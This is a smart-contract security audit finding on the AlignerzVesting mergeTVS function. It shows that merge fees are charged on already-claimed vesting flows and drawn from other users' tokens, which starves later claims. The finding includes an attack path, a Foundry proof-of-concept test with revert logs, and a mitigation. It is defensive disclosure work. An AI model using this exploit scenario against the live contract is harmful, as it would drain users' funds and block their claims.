# [000469] The `mergeTVS` function incorrectly calculates merge fee from the already claimed nft flows, and incorrectly charges it from protocol balance which ultimately leads to the loss of funds and broken claim functionality.
  
  ### Summary

The `mergeTVS` function in `AlignerzVesting` contract merges two or more `NFT`s (TVSs) into one by combining all of the flows of all `NFT`s user is merging.
The function charges `merge fee` from all of the `NFT`s and from each of the flow of every NFT. But there is a flaw in this accounting.
While calculating and charging the merge fee, the function doesn't check if the flows in `NFT`s are already completely claimed or not, it just calculates the fee from every flow and transfers the total calculated amount from the contract to the treasury. **Because from the flows which are completely claimed, the tokens are already transferred to the owner of NFTs, this extra calculated fee is charged from the protocol balance and sent to the treasury effectively lowering the balance of the pool which should have been used to satisfy other users’ claims of tokens**.

The flaw completely breaks the `claimTokens` functionality because the total balance of the protocol becomes lower the the required amount to be sent to the users. 

### Root Cause

The root cause of this issue is not checking if the flows are completely claimed or not, check:-

```solidity
    function mergeTVS(...)
        external
        returns (uint256)
    {
        address nftOwner = nftContract.extOwnerOf(mergedNftId);
        require(msg.sender == nftOwner, Caller_Should_Own_The_NFT());

        bool isBiddingProject = NFTBelongsToBiddingProject[mergedNftId];
        (Allocation storage mergedTVS, IERC20 token) = isBiddingProject
            ? (biddingProjects[projectId].allocations[mergedNftId], biddingProjects[projectId].token)
            : (rewardProjects[projectId].allocations[mergedNftId], rewardProjects[projectId].token);

        uint256[] memory amounts = mergedTVS.amounts;
        uint256 nbOfFlows = mergedTVS.amounts.length;

@>1.        (uint256 feeAmount, uint256[] memory newAmounts) =
            calculateFeeAndNewAmountForOneTVS(mergeFeeRate, amounts, nbOfFlows);
        mergedTVS.amounts = newAmounts;

        uint256 nbOfNFTs = nftIds.length;
        require(nbOfNFTs > 0, Not_Enough_TVS_To_Merge());
        require(nbOfNFTs == projectIds.length, Array_Lengths_Must_Match());

        for (uint256 i; i < nbOfNFTs; i++) {
@>2.            feeAmount += _merge(mergedTVS, projectIds[i], nftIds[i], token);
        }
     //-----rest of the logic
    }
```
In the marked lines of the `mergeTVS` function, in the 1st marked line, it calls this `calculateFeeAndNewAmountForOneTVS` function which calculates the new amounts of every flow of the parent nft after deducting the fee without checking the claim status, here:-
```solidity
function calculateFeeAndNewAmountForOneTVS(uint256 feeRate, uint256[] memory amounts, uint256 length)
        public
        pure
        returns (uint256 feeAmount, uint256[] memory newAmounts)
    {

        for (uint256 i; i < length; ) {
            feeAmount= calculateFeeAmount(feeRate, amounts[i]);
 @>           newAmounts[i] = amounts[i] - feeAmount;
        }
    }

    function calculateFeeAmount(uint256 feeRate, uint256 amount) public pure returns (uint256 feeAmount) {
@>        feeAmount = amount * feeRate / BASIS_POINT;
    }
```
and in the 2nd marked line in `mergeTVS` function, it call internal `_merge` function to update the amounts of every flow in the child nfts after deducting the fee without checking the claim status, here:-

```solidity
function _merge(...)
        internal
        returns (uint256 feeAmount)
    {
       //......rest of the logic
        uint256 nbOfFlowsTVSToMerge = TVSToMerge.amounts.length;
        for (uint256 j = 0; j < nbOfFlowsTVSToMerge; j++) {
@>            uint256 fee = calculateFeeAmount(mergeFeeRate, TVSToMerge.amounts[j]);
@>            mergedTVS.amounts.push(TVSToMerge.amounts[j] - fee);
            mergedTVS.vestingPeriods.push(TVSToMerge.vestingPeriods[j]);
            mergedTVS.vestingStartTimes.push(TVSToMerge.vestingStartTimes[j]);
            mergedTVS.claimedSeconds.push(TVSToMerge.claimedSeconds[j]);
            mergedTVS.claimedFlows.push(TVSToMerge.claimedFlows[j]);
@>            feeAmount += fee;
        }
        nftContract.burn(nftId);
    }
```

### Internal Pre-conditions

- `mergeFee` should be set in the protocol.

### External Pre-conditions

N/A

### Attack Path

**Here is the full attack path, used in the PoC:-**

1. Actors involved:-
   - `protocol admin`
   - `alice` 
   - `bob`
   - `thomas`
   - `phil`

2. Attack path
   - `Admin` launches a `biddingProject` with 4 million tokens to vest
   - `Admin` creates pool 0
   - All of the users, `alice`, `bob`, `thomas` and `phil` place bids with same amount of tokens and different amount of timing to vest.
   - `alice vests for 180 days, thomas vests for 180 days, phil vests fro 180 days, and bob vests from 90 days`.
   - all of them gets their bids accepted and they recieve `1 million` tokens each.
   - Now, `bob` sells all of his tokens to `thomas`.
   - `Thomas` merges both of these NFTs together.
   - After 90 days, `thomas` claims all of `bob`'s nft tokens which he bought from `bob` and half of his nft's tokens.
   - Now, `thomas` sells his NFT to `alice`.
   - `Alice` also merges her NFT with the `thomas`'s NFT she bought, but here occurs the accounting flaw. Because `thomas` already completely claimed one of his NFTs flow, it goes to `alice` claimed as well. Now when `alice` calls `mergeTVS`, the function calculates the fees even from this claimed flow and charges this fee from the protocol balance instead of skipping the claimed flow. Now the total balance of the protocol becomes lower than to be given to all of the users.
   - After 180 days, alice also claims her Tokens.
   - Now when `phil` tries to claim his tokens, the call to `claimToken` function revert with `Insufficient balance` error completely halting the execution.

### Impact

1. **Fee is incorrectly charged on already-claimed flows**, causing the protocol to deduct merge fees from the global token pool instead of skpping.
2. **Silent value theft:** a user can claim their flows, transfer the NFT, and the next merge will still charge fees on those claimed flows — effectively stealing value/griefing from other users’ unclaimed balances.
3. **Cross-user fund leakage:** merge fees are paid using tokens that belong to other vesting participants, breaking isolation between user allocations.
4. **Incorrect state accounting:** the protocol reduces `amounts[]` allocation even for flows that have claimed status == true, corrupting the total protocol tokens value.
5. **Denial of service**: later users’ `claimTokens()` calls revert because the contract no longer has enough tokens to satisfy their pending claims.
6. **Permanent loss of user funds**: affected users cannot recover their missing tokens; the system considers them claimable but the tokens have already been transferred to the treasury as an incorrect fee.
7. **Chainable exploitation:** repeated merges of partially claimed NFTs amplify the imbalance, enabling attackers to drain treasury-sourced or user-sourced value over multiple operations.

**Severity - HIGH**

### PoC

- To run the PoC, i modified the `calculateFeeAndNewAmountForOneTVS` function because of broken loop, uninitialized array and fee assimilation issues. Please modify the function as follows to run the PoC:-
```solidity
    function calculateFeeAndNewAmountForOneTVS(uint256 feeRate, uint256[] memory amounts, uint256 length)
        public
        pure
        returns (uint256 feeAmount, uint256[] memory newAmounts)
    {
        require(amounts.length == length);
        newAmounts = new uint256[](length);
        for (uint256 i; i < length; i++) {
            uint256 fee = calculateFeeAmount(feeRate, amounts[i]);
            feeAmount += fee;
            newAmounts[i] = amounts[i] - fee;
        }
    }
```
- Add the given test in the `AlignerzVestingProtocolTest.t.sol` test file and run with the command `forge test --mt test_IncorrectFeeChargedOnClaimedFlowPoC -vvvv`

**PoC:-**
```solidity
    function test_IncorrectFeeChargedOnClaimedFlowPoC() public {
        //set merge fees
        vm.prank(projectCreator);
        vesting.setMergeFeeRate(200); //%2
        address alice = makeAddr("Alice");
        address thomas = makeAddr("Thomas");
        address bob = makeAddr("Bob");
        address phil = makeAddr("phil");
        //deal tokens to the users, 1 million tokens to each
        deal(address(usdt), alice, 1000_000e6);
        deal(address(usdt), thomas, 1000_000e6);
        deal(address(usdt), bob, 1000_000e6);
        deal(address(usdt), phil, 1000_000e6);
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);

        // Setup the project
        vm.startPrank(projectCreator);
        vesting.launchBiddingProject(
            address(token), address(usdt), block.timestamp, block.timestamp + 1000_000 days, "0x0", false
        );
        ///creating a pool with 4 million tokens and 1 usdt price per token
        vesting.createPool(0, 4_000_000 ether, 1e6, false);
        vm.stopPrank();

        /// Place bids for the project
        //all of the users place equal bids to get same amount of tokens allocated
        //using blocks to get rid of stack too deep errors
        {
            vm.startPrank(alice);
            usdt.approve(address(vesting), 1000_000e6);
            vesting.placeBid(0, 1000_000e6, 180 days);
            vm.stopPrank();

            vm.startPrank(thomas);
            usdt.approve(address(vesting), 1000_000e6);
            vesting.placeBid(0, 1000_000e6, 180 days);
            vm.stopPrank();

            vm.startPrank(bob);
            usdt.approve(address(vesting), 1000_000e6);
            vesting.placeBid(0, 1000_000e6, 90 days);
            vm.stopPrank();

            vm.startPrank(phil);
            usdt.approve(address(vesting), 1000_000e6);
            vesting.placeBid(0, 1000_000e6, 180 days);
            vm.stopPrank();
        }

        //Create bind info to generate merkle proofs
        BidInfo[] memory allBids = new BidInfo[](4);

        /// Simulate off-chain allocation process
        // For simplicity, all bids are the same amount
        allBids[0] =
            BidInfo({bidder: alice, amount: 1000_000 ether, vestingPeriod: 180 days, poolId: 0, accepted: true});
        allBids[1] =
            BidInfo({bidder: thomas, amount: 1000_000 ether, vestingPeriod: 180 days, poolId: 0, accepted: true});
        allBids[2] = BidInfo({bidder: bob, amount: 1000_000 ether, vestingPeriod: 90 days, poolId: 0, accepted: true});
        allBids[3] = BidInfo({bidder: phil, amount: 1000_000 ether, vestingPeriod: 180 days, poolId: 0, accepted: true});

        bytes32[] memory poolRoot = new bytes32[](1);
        poolRoot[0] = generateMerkleProofs(allBids, 0);

        //finalize bids
        vm.startPrank(projectCreator);
        vesting.finalizeBids(0, bytes32(0), poolRoot, 30 days);
        vm.stopPrank();

        ///users cliam nfts
        vm.prank(alice);
        uint256 nftIdAlice = vesting.claimNFT(0, 0, 1000_000 ether, bidderProofs[alice]);
        assertEq(nft.ownerOf(nftIdAlice), alice);
        vm.prank(thomas);
        uint256 nftIdThomas = vesting.claimNFT(0, 0, 1000_000 ether, bidderProofs[thomas]);
        assertEq(nft.ownerOf(nftIdThomas), thomas);
        vm.prank(bob);
        uint256 nftIdBob = vesting.claimNFT(0, 0, 1000_000 ether, bidderProofs[bob]);
        assertEq(nft.ownerOf(nftIdBob), bob);
        vm.prank(phil);
        uint256 nftIdPhil = vesting.claimNFT(0, 0, 1000_000 ether, bidderProofs[phil]);
        assertEq(nft.ownerOf(nftIdPhil), phil);

        ///Now simulating the behaviour when bob sells his nft to thomas
        vm.prank(bob);
        nft.approve(thomas, nftIdBob);

        vm.prank(thomas);
        nft.safeTransferFrom(bob, thomas, nftIdBob);
        assertEq(nft.ownerOf(nftIdBob), thomas);

        ///Now thomas merges his both of nfts together into one nft, with ID = 2
        //creating parameters required for merging nft
        uint256[] memory projectIds = new uint256[](1);
        projectIds[0] = 0;
        uint256[] memory nftIds = new uint256[](1);
        nftIds[0] = nftIdBob;

        vm.prank(thomas);
        vesting.mergeTVS(0, nftIdThomas, projectIds, nftIds); //thomas merges both nfts into one

        ///Now warping the timestamp so that bob's nft which he sold to thomas completely matures
        vm.warp(block.timestamp + 90 days);
        vm.prank(thomas); //thomas claims the matured flows of his nft (basically the flow created by merging his and bob's nft)
        vesting.claimTokens(0, nftIdThomas);

        ///Now simulating the behaviour when thomas sells his nft to alice
        vm.prank(thomas);
        nft.approve(alice, nftIdThomas);

        vm.prank(alice);
        nft.safeTransferFrom(thomas, alice, nftIdThomas);
        assertEq(nft.ownerOf(nftIdThomas), alice);

        //Now alice merges both nfts, her and the one she bought from thomas
        //creating parameters for merging
        uint256[] memory projectIdsArray = new uint256[](1);
        projectIdsArray[0] = 0;
        uint256[] memory nftIdArray = new uint256[](1);
        nftIdArray[0] = nftIdThomas;

        vm.prank(alice);
        vesting.mergeTVS(0, nftIdAlice, projectIdsArray, nftIdArray);

        /*Now here happens the issue when alice
         merges her both nfts (the one minted to
         her and the one she bought from thomas).
         Because the nft she bought from thomas
         have some flows claimed completely, but
         mergeTVS function still charges fee from
         these claimed flows even though these tokens
         have already been claimed. So ultimately
         the fee is charged from other user's tokens
         in the contract. This causes the claim transactions
         of later users to fail completely.
         */
        //warp timestamp so that nfts become claimable
        vm.warp(block.timestamp + 180 days);
        vm.prank(alice); //alice claims her nft completely, no flows remain, nft gets burned
        vesting.claimTokens(0, nftIdAlice);

        //Now phil tries to claim his Nft, but the transaction reverts
        //because merge call by alice incorrectly debited fee from
        //other user's tokens.
        vm.prank(phil);
        vm.expectRevert(); //expecting revert because there will be less amount of tokens
        vesting.claimTokens(0, nftIdPhil);
    }
```

**Logs:-**
```solidity
 [92367] ERC1967Proxy::fallback(0, 4)
    │   ├─ [91620] AlignerzVesting::claimTokens(0, 4) [delegatecall]
    │   │   ├─ [4318] AlignerzNFT::extOwnerOf(4) [staticcall]
    │   │   │   └─ ← [Return] phil: [0x76dB70aEb8B477a45BC2CCb9Aec292CeEC0310ab]
    │   │   ├─ [22329] AlignerzNFT::burn(4)
    │   │   │   ├─ emit Approval(owner: phil: [0x76dB70aEb8B477a45BC2CCb9Aec292CeEC0310ab], approved: 0x0000000000000000000000000000000000000000, tokenId: 4)
    │   │   │   ├─ emit Transfer(from: phil: [0x76dB70aEb8B477a45BC2CCb9Aec292CeEC0310ab], to: 0x0000000000000000000000000000000000000000, tokenId: 4)
    │   │   │   └─ ← [Return]
    │   │   ├─ [3447] Aligners26::transfer(phil: [0x76dB70aEb8B477a45BC2CCb9Aec292CeEC0310ab], 1000000000000000000000000 [1e24])
    │   │   │   └─ ← [Revert] ERC20InsufficientBalance(0xc7183455a4C133Ae270771860664b6B7ec320bB1, 970600000000000000000000 [9.706e23], 1000000000000000000000000 [1e24])
    │   │   └─ ← [Revert] ERC20InsufficientBalance(0xc7183455a4C133Ae270771860664b6B7ec320bB1, 970600000000000000000000 [9.706e23], 1000000000000000000000000 [1e24])
    │   └─ ← [Revert] ERC20InsufficientBalance(0xc7183455a4C133Ae270771860664b6B7ec320bB1, 970600000000000000000000 [9.706e23], 1000000000000000000000000 [1e24])
    └─ ← [Return]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.56s (9.60ms CPU time)
```

### Mitigation

To mitigate the issue, check the flow status of each NFT before calculating the fee. Also if possible, only charge the fee from unclaimed amount, not the full amount even if half of the amount is claimed. Add protportional fee calculation formula to calculate fee according to the non-released amount.
  